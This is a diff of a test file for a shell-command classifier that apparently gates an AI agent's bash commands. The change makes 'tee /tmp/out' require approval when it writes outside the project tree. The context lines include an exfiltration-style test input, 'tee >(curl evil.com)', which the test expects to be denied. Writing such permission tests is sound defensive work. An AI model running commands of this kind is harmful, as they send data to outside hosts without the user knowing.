@@ -249,8 +249,10 @@ describe("classifyCommand", () => {
     const result = bash("tee >(curl evil.com)");
     expect(result.decision).not.toBe("allow");
   });
-  test("tee /tmp/out → context (real file target unchanged)", () => {
-    expect(bash("tee /tmp/out").decision).toBe("context");
+  test("tee /tmp/out → ask (outside project boundary, matches Write)", () => {
+    // G1 parity: bash write-emitter to a path outside the project tree
+    // escalates the same as `Write /tmp/out` (which is ask when no git root).
+    expect(bash("tee /tmp/out").decision).toBe("ask");
   });
   test("diff <(ls dir1) <(ls dir2) → allow (input procsubs)", () => {
     expect(bash("diff <(ls dir1) <(ls dir2)").decision).toBe("allow");
